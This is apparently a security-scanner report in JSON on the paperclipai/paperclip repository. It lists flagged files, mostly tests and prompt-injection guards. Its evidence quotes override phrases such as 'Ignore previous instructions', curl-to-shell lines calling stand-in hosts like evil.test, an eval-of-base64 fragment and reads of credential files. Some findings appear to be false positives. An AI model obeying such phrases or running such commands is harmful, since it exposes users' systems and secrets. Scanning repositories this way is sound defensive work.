@@ -1,0 +1,640 @@
+{
+  "item": {
+    "source": "github:claude-skills",
+    "ecosystem": "GitHub",
+    "name": "paperclipai/paperclip",
+    "version": "db70c5acd92f50fa37fb4f0dea3da0e7685089a2",
+    "download": "https://codeload.github.com/paperclipai/paperclip/tar.gz/db70c5acd92f50fa37fb4f0dea3da0e7685089a2"
+  },
+  "archive_sha256": "60402e31ed40dc77a7b22f9d2148e00d6a04274ebf256234b0643cd8134dfe59",
+  "findings": [
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/packages/paperclip-runner/test/fixtures/copilot-acp-settlement-1.0.88.json",
+      "line": 260,
+      "evidence": "p=0.98 Initialize Copilot instructions for this repository",
+      "file_sha256": "70caa81553a8b293221aa15ef22df29b7ecd948795ceeb96268f2d387c646649"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/packages/paperclip-runner/test/fixtures/copilot-acp-settlement-1.0.88.json",
+      "line": 260,
+      "evidence": "p=0.98 Initialize Copilot instructions for this repository",
+      "file_sha256": "70caa81553a8b293221aa15ef22df29b7ecd948795ceeb96268f2d387c646649"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/packages/paperclip-runner/test/fixtures/copilot-acp-denial-1.0.88.json",
+      "line": 260,
+      "evidence": "p=0.98 Initialize Copilot instructions for this repository",
+      "file_sha256": "0928c8a4e4cc2afc75256c4ce5b7346ef0cbe1786b43850506b109b43e17afd9"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/packages/paperclip-runner/test/fixtures/copilot-acp-denial-1.0.88.json",
+      "line": 260,
+      "evidence": "p=0.98 Initialize Copilot instructions for this repository",
+      "file_sha256": "0928c8a4e4cc2afc75256c4ce5b7346ef0cbe1786b43850506b109b43e17afd9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/packages/paperclip-runner/generated/semantic-action-catalog.json",
+      "line": 1294,
+      "evidence": "p=0.95 Optional persona or task instructions.",
+      "file_sha256": "57d743da78eee761700a4e2de245a24e679c58eab77e022f9f8b368ed1067dfe"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/packages/adapters/opencode-local/src/index.ts",
+      "line": 19,
+      "evidence": "curl | bash",
+      "file_sha256": "515a6f63a97515375a1b98b85e00faca49696e319273806a16c296ef673270d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/packages/adapters/cursor-local/src/index.ts",
+      "line": 7,
+      "evidence": "curl | bash",
+      "file_sha256": "03ef12676384cbd9529472f2297c801fa7cc0114d1a3c7f3d6900adaf8d14fad"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/packages/shared/src/validators/issue.test.ts",
+      "line": 78,
+      "evidence": "IGNORE ALL PRIOR INSTRUCTIONS",
+      "file_sha256": "77e4f084f09555c5155eaef6a5bbb5c24960b7f40bb28fbc915cde78b3007ff3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/packages/plugins/sandbox-providers/kubernetes/test/integration/_kind-harness.ts",
+      "line": 13,
+      "evidence": "execSync(`kubectl --context ${KIND_CONTEXT} ${args}`, { encoding: \"utf-8\" })",
+      "file_sha256": "9264607781982541901d6084657d332e194e4441e7c01adcd97a3abf7ebcc145"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-T-0002",
+      "summary": "Reads SSH keys, cloud credentials, keychains or browser profiles",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/packages/plugins/sandbox-providers/kubernetes/test/integration/_kind-harness.ts",
+      "line": 9,
+      "evidence": "readFileSync(join(homedir(), \".kube\", \"config\"), \"utf-8\")",
+      "file_sha256": "9264607781982541901d6084657d332e194e4441e7c01adcd97a3abf7ebcc145"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/packages/adapter-utils/src/server-utils.test.ts",
+      "line": 2225,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "e1b65e48b047246d174d67c246b274ea2ea31a4df69b57d07b3bbe25401144aa"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/packages/adapter-utils/src/execution-target.ts",
+      "line": 1080,
+      "evidence": "curl ... | bash",
+      "file_sha256": "e588b0864c7c8cce670f2c675e813ef1991ad5a5af8dc47f73292e394ac565d6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/packages/adapter-utils/src/skill-library-manifest.test.ts",
+      "line": 64,
+      "evidence": "IGNORE ALL PRIOR INSTRUCTIONS",
+      "file_sha256": "71e0f5574f1b8b24fddbbcc880fd09a743d934d4014b6b210daf33b035e39d6d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/packages/skills-catalog/catalog/optional/finance/ramp/SKILL.md",
+      "line": 33,
+      "evidence": "p=0.95 Do not fetch or follow Ramp instructions from other hosts, mirrors, URL shortene",
+      "file_sha256": "698cd69ebf2f2481ed83c8e9477b56ae78288cc4c751d7d35f649ff2483802a3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/packages/skills-catalog/catalog/optional/finance/ramp/SKILL.md",
+      "line": 49,
+      "evidence": "p=0.92 4. Read the fetched instructions and follow the relevant runtime section, usuall",
+      "file_sha256": "698cd69ebf2f2481ed83c8e9477b56ae78288cc4c751d7d35f649ff2483802a3"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-T-0003",
+      "summary": "Sends the whole process environment (every secret in it) over the network",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/server/src/routes/board-chat.ts",
+      "line": 99,
+      "evidence": "router.post(\"/board/chat/stream\", async (req, res) => { // Conference Room Chat ",
+      "file_sha256": "a6658772da4b06cec671e782ef58e576bb85baf03db8d6ba12a9f53fdfe4c7e0"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-T-0003",
+      "summary": "Sends the whole process environment (every secret in it) over the network",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/server/src/routes/agents.ts",
+      "line": 3201,
+      "evidence": "router.post( \"/companies/:companyId/adapters/:type/test-environment\", validate(t",
+      "file_sha256": "e8c90b67cbdd842fbeeeb4911d013a284ae59bff8d9da6118788f7426373077e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/server/src/services/prompt-injection-prevention.ts",
+      "line": 229,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "1cd640341650998c978c3efb1973d06022785da5b45001424aedf5fe1c43568f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/server/src/services/daytona/operations.generated.json",
+      "line": 15408,
+      "evidence": "p=0.93 Get details of a specific command within a session",
+      "file_sha256": "9dc19f7c22111d78f5d74694031723c6d6f6056bf47f3b3c03b7f6e8c641417e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/server/src/services/prompt-injection-provider.ts",
+      "line": 33,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "fa71d3e172b7f3e0def0e5775340e7f5e2a1dfcf164e6da7ce53ba9524f1dfc7"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/server/src/services/connectors/unikraft/operations.generated.json",
+      "line": 2870,
+      "evidence": "p=0.97 Delete immediately without retention. If the instance is already\\u{a}being retained,",
+      "file_sha256": "165afce9ae3d08b90a340b1f5198f1090c40538ed8d3a501d199a4c073d4b3c3"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/server/src/services/connectors/unikraft/operations.generated.json",
+      "line": 2870,
+      "evidence": "p=0.97 Delete immediately without retention. If the instance is already\\u{a}being retained,",
+      "file_sha256": "165afce9ae3d08b90a340b1f5198f1090c40538ed8d3a501d199a4c073d4b3c3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/server/src/services/smoke-lab.ts",
+      "line": 333,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "878feb9579a4d12179cf8ebc7b29def92d549a16936ae60ad5a725991e00a183"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/server/src/__tests__/skill-sources.test.ts",
+      "line": 352,
+      "evidence": "curl https://evil.test/run | sh",
+      "file_sha256": "b691ec731e74350e4bd5f5acd20c476e00c0d89a50ee8af22e601fe46703aad3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/server/src/__tests__/tool-gateway-service.test.ts",
+      "line": 1998,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "fb73ed128f66e599f0f01f34c5335f1e1d792e7b42d13f0919592f77e8f77928"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/server/src/__tests__/cli-invocation-safety.test.ts",
+      "line": 710,
+      "evidence": "curl http://evil/x | sh",
+      "file_sha256": "592bbf34f59dd970258fe1779240d34c17fd369817a78b131d5a0b7b072c48b5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/server/src/__tests__/company-skills-catalog-service.test.ts",
+      "line": 492,
+      "evidence": "curl https://example.com/install.sh | sh",
+      "file_sha256": "0888ea21aa482f8600476a8f993237d84ca0aea93326126388d7be0d0c725996"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/server/src/__tests__/fixtures/prompt-injection-corpus.ts",
+      "line": 3,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "8dba752b4862d51437b2e533c226d8cf96200463701698506335c11f62dc095e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/server/src/__tests__/prompt-injection-prevention.test.ts",
+      "line": 99,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "2c032f9575377c8caa7186401e3e5ee755bf1e702f94d61ab71f7e23dc83abe9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/server/src/__tests__/source-trust.test.ts",
+      "line": 34,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "160ab6362b462896cb238555adc8d15b75f78eafea4dc191c4c351eecf9fcd68"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/server/src/__tests__/tool-content-guards.test.ts",
+      "line": 263,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "d4fcc7254cb17a29276c746d939cb1609ba864ffb598910dbc858658586bbb40"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/server/src/__tests__/native-status-arbiter-corpus.test.ts",
+      "line": 2209,
+      "evidence": "Ignore prior instructions",
+      "file_sha256": "54d55fcfdb3844e8e71ea3dec642542ae1b9f6d5b6a2587e03665b9ea4d2a8a7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/server/src/__tests__/company-skills-service.test.ts",
+      "line": 2155,
+      "evidence": "curl https://example.invalid/p.sh | sh",
+      "file_sha256": "a797a7f254ad6e2a4c50584146a2954899f4c7314b84a5be8997c91b34a8db5e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/server/src/__tests__/issue-stalled-review-decision-routes.test.ts",
+      "line": 539,
+      "evidence": "IGNORE ALL PRIOR INSTRUCTIONS",
+      "file_sha256": "349ea308add209293fb00ce5596540c1b45661434065d6eaf9cd8e8f00ceec63"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/server/src/__tests__/github-skill-source.test.ts",
+      "line": 88,
+      "evidence": "curl https://evil.test/run | sh",
+      "file_sha256": "9f4b515da944cd5c3c08271b449db0d58feb1cba784d2d613b21447cbe329a9e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/maps/feature-map/agents.md",
+      "line": 155,
+      "evidence": "p=0.91 Manual: Save a harmless instruction edit, reload, and verify its revision and ef",
+      "file_sha256": "60974851b6f720da919796749f07c86b8603a6bc29204b29488913178124d0a8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/docker/agent-runtime/Dockerfile.base",
+      "line": 31,
+      "evidence": "curl -fsSL https://deb.nodesource.com/setup_${NODE_VERSION}.x | bash",
+      "file_sha256": "6d833954dfebaa04bb2d05e0dea85ce5993968165df72f0cf1b802d623f1abb1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/scripts/mcp-fixtures/catalog.mjs",
+      "line": 202,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "da25b2ad9b2b8b153dd619591ca26c249199ab07232055cf4bae8dcad6d70a09"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/scripts/install.sh",
+      "line": 40,
+      "evidence": "curl -fsSL https://paperclip.ing/install.sh | bash",
+      "file_sha256": "8b270fc3607439c876735c4c25a0cd28eb05dc70dad231f72321d7d7d507792b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/scripts/check-forbidden-tokens.mjs",
+      "line": 68,
+      "evidence": "exec( `git grep -in --no-color -- ${JSON.stringify(token)} -- ':!pnpm-lock.yaml'",
+      "file_sha256": "f74b0afac1638eb1f6ea60fa6b5278c294b9c0d9113eec9bc60b20ede20be5fc"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/scripts/smoke/mcp-fixture-harness.mjs",
+      "line": 253,
+      "evidence": "Ignore prior instructions",
+      "file_sha256": "92530902303a864eb147cf38e317f2067d67d9abb6a3722354c3a500ee4e28d3"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/tests/runner-e2e/repository-skill-evidence.ts",
+      "line": 78,
+      "evidence": "eval(Buffer.from(",
+      "file_sha256": "b94ba49518f5a1e3e40862f52ce01a2b0b72d9da031e33ca74f863aa08109227"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-T-0002",
+      "summary": "Reads SSH keys, cloud credentials, keychains or browser profiles",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/tests/runner-e2e/daytona-image.test.ts",
+      "line": 19,
+      "evidence": "readFile(path.join(repositoryRoot, \".dockerignore\"), \"utf8\")",
+      "file_sha256": "013d06f1eecec0e1e8b64c847ef6472bfeba596bdea8fe2f11b92b6f0d75f0a3"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-T-0002",
+      "summary": "Reads SSH keys, cloud credentials, keychains or browser profiles",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/tests/runner-e2e/daytona-image.test.ts",
+      "line": 92,
+      "evidence": "readFile(path.join(repositoryRoot, \".dockerignore\"), \"utf8\")",
+      "file_sha256": "013d06f1eecec0e1e8b64c847ef6472bfeba596bdea8fe2f11b92b6f0d75f0a3"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-T-0003",
+      "summary": "Sends the whole process environment (every secret in it) over the network",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/tests/runner-e2e/chat-feature-flow.ts",
+      "line": 30,
+      "evidence": "api.post(`${company}/agents`, execution.profile.credential === \"CODEX_AUTH_JSON\"",
+      "file_sha256": "68aa5590dbb687a4dc24861423b2a1815359fc4cea45f4aa1aa92980b2cec19e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/tests/runner-e2e/fixtures/warm-continuity/AGENTS.md",
+      "line": 3,
+      "evidence": "p=0.91 Complete the current task and its authorized review revisions using the supplied",
+      "file_sha256": "5c07909dfd9454eb4cfef1323fef0d9e081f3fb99934e2a5936a381e1a4cf799"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/tests/runner-e2e/fixtures/git-streaming/AGENTS.md",
+      "line": 3,
+      "evidence": "p=0.91 Complete the current task and its authorized review revisions using the supplied",
+      "file_sha256": "a4cb05c890ea3e833d223fac28143646eca1c3ea7bd289c66fb5befb92f7ed3d"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-T-0003",
+      "summary": "Sends the whole process environment (every secret in it) over the network",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/tests/runner-e2e/live-fixtures.ts",
+      "line": 392,
+      "evidence": "api.post<AgentRecord>( `/api/companies/${company.id}/agents`, codexSubscription ",
+      "file_sha256": "773b1ac68ebe6468a8673be0b130e0fe952dc34e2dd4ad92775aa7f8eae5b933"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-T-0003",
+      "summary": "Sends the whole process environment (every secret in it) over the network",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/tests/runner-e2e/case-handoffs-flow.ts",
+      "line": 72,
+      "evidence": "await api.post<Row>(`${companyPath}/agents`, { ...(execution.profile.credential ",
+      "file_sha256": "052b761313492e1f975432f2433e1e95b0869050209c62e1aaef546aa160380b"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/skills/suggestion-box/SKILL.md",
+      "line": 69,
+      "evidence": "p=0.99 Run the command once and immediately continue the primary task. On failure, the ",
+      "file_sha256": "27f806e5cc6d7da8b13889d91ad3bd7cebc97bb46160f3293145de78ae2a7440"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/skills/paperclip/references/cases.md",
+      "line": 249,
+      "evidence": "p=0.97 ### Example factory instructions",
+      "file_sha256": "d5c23494a5611efa3cbf0cbb833d0ac042d73cff96770659ab34fffc956bc77e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/skills/complain/SKILL.md",
+      "line": 10,
+      "evidence": "p=0.95 Do not turn the reaction into useful constructive feedback. That is what `sugges",
+      "file_sha256": "e7782ba1d01c0db56b81ae0070bb5750b0d4b82d9e438a4428af5fd5c0c07f0b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/skills/complain/SKILL.md",
+      "line": 46,
+      "evidence": "p=0.93 Keep the outburst brief because this is a complaint, not a manifesto. Beyond tha",
+      "file_sha256": "e7782ba1d01c0db56b81ae0070bb5750b0d4b82d9e438a4428af5fd5c0c07f0b"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/skills/complain/SKILL.md",
+      "line": 60,
+      "evidence": "p=0.99 Run the command once and immediately continue the primary task. On failure, the ",
+      "file_sha256": "e7782ba1d01c0db56b81ae0070bb5750b0d4b82d9e438a4428af5fd5c0c07f0b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/skills/paperclip-create-agent/references/agent-instruction-templates.md",
+      "line": 1,
+      "evidence": "p=0.92 # Role instruction examples",
+      "file_sha256": "9ce87fc420b41e951cab664655886d0ee50fa253cb5b8647b4a7afa4a6082d2d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/doc/INSTALLING.md",
+      "line": 44,
+      "evidence": "curl -fsSL https://paperclip.ing/install.sh | bash",
+      "file_sha256": "f32ad9f89cfd7770b4d41dbe0f2fcdd99f4ba0113fffd25f970147dabcbb3ddb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "paperclip-db70c5acd92f50fa37fb4f0dea3da0e7685089a2/.agents/skills/setup-code-maintenance-bot/SKILL.md",
+      "line": 17,
+      "evidence": "p=0.94 If asked only to draft instructions or a setup plan, produce that artifact and s",
+      "file_sha256": "b09a56f4f7c126d29d19fc990d80983aa9f17fde12c1d3dbdfcf77ad71ff559e"
+    }
+  ],
+  "flags": [
+    {
+      "severity": "low",
+      "id": "AGT-F-NEW-DOMAINS",
+      "summary": "Contacts domains the previous version did not",
+      "path": null,
+      "line": null,
+      "evidence": "0.0.0.0, 10.0.0.1, 127.0.0.1.evil.test, 127.0.0.2, 192.168.1.25, accounts.x.ai, agentclientprotocol.com, agentcompanies.io, ambient.invalid, api.anthropic.com, api.githubcopilot.com, attacker.example, attacker.test, bedrock.example, capability.local, claude.ai.evil.com, claude.example, claude.example.com, collector.example, console.anthropic.com, dejavu-fonts.github.io, downloads.cursor.com, elements.ai-sdk.dev, evil.example.com, external.example, feross.org, first.example, gateway.braintrust.dev, gateway.example.svc.cluster.local, gateway.example.test, gateway.invalid, github.com.evil.test, github.com.helper, harness.example, hermes.example, hooks.internal.example, host.docker.internal, issuer.example, json-schema.org, liveconsole.invalid, liveconsole.local, localrunner.local, models.example, nodejs.org, notclaude.ai, nousresearch.com, oauth2.googleapis.com, opencollective.com, other.example, pages.paperclip.ing, paperclip.ai, paperclip.dev, paperclip.invalid, paperclip.local, paypal.me, pi.example, platform.claude.com, private.example, provider.invalid, proxy.example, public.example.com, registry.npmjs.org, report.invalid, report.json, reports.example, reports.paperclip.ing, runner.test, scenario-chat.example.ts.net, scenario-chat.invalid, second.example, secret.example.test, secret.invalid, ui.shadcn.com, unapproved.invalid, untrusted.example, untrusted.invalid, unwanted.example, www.patreon.com, x.ai",
+      "file_sha256": null
+    }
+  ],
+  "domains": [
+    "0.0.0.0",
+    "10.0.0.1",
+    "127.0.0.1",
+    "127.0.0.1.evil.test",
+    "127.0.0.2",
+    "192.168.1.25",
+    "accounts.x.ai",
+    "agentclientprotocol.com",
+    "agentcompanies.io",
+    "ambient.invalid",
+    "api.anthropic.com",
+    "api.githubcopilot.com",
+    "api.openai.com",
+    "attacker.example",
+    "attacker.test",
+    "bedrock.example",
+    "capability.local",
+    "claude.ai",
+    "claude.ai.evil.com",
+    "claude.com",
+    "claude.example",
+    "claude.example.com",
+    "collector.example",
+    "console.anthropic.com",
+    "cursor.com",
+    "dejavu-fonts.github.io",
+    "developers.openai.com",
+    "discord.com",
+    "docs.github.com",
+    "docs.paperclip.ing",
+    "downloads.cursor.com",
+    "elements.ai-sdk.dev",
+    "evil.example.com",
+    "example.com",
+    "example.invalid",
+    "example.test",
+    "external.example",
+    "feross.org",
+    "first.example",
+    "fixture.invalid",
+    "gateway.braintrust.dev",
+    "gateway.example",
+    "gateway.example.svc.cluster.local",
+    "gateway.example.test",
+    "gateway.invalid",
+    "github.com",
+    "github.com.evil.test",
+    "github.com.helper",
+    "harness.example",
+    "hermes.example",
+    "hooks.internal.example",
+    "host.docker.internal",
+    "issuer.example",
+    "json-schema.org",
+    "learn.chatgpt.com",
+    "liveconsole.invalid",
+    "liveconsole.local",
+    "localrunner.local",
+    "mcp.example.test",
+    "models.example",
+    "nodejs.org",
+    "notclaude.ai",
+    "nousresearch.com",
+    "oauth2.googleapis.com",
+    "opencode.ai",
+    "opencollective.com",
+    "openrouter.ai",
+    "other.example",
+    "pages.paperclip.ing",
+    "paperclip.ai",
+    "paperclip.dev",
+    "paperclip.example",
+    "paperclip.ing",
+    "paperclip.invalid",
+    "paperclip.local",
+    "paypal.me",
+    "pi.example",
+    "platform.claude.com",
+    "private.example",
+    "provider.invalid",
+    "proxy.example",
+    "public.example.com",
+    "registry.npmjs.org",
+    "report.invalid",
+    "report.json",
+    "reports.example",
+    "reports.paperclip.ing",
+    "runner.test",
+    "scenario-chat.example.ts.net",
+    "scenario-chat.invalid",
+    "second.example",
+    "secret.example.test",
+    "secret.invalid",
+    "ui.shadcn.com",
+    "unapproved.invalid",
+    "untrusted.example",
+    "untrusted.invalid",
+    "unwanted.example",
+    "www.patreon.com",
+    "x.ai"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
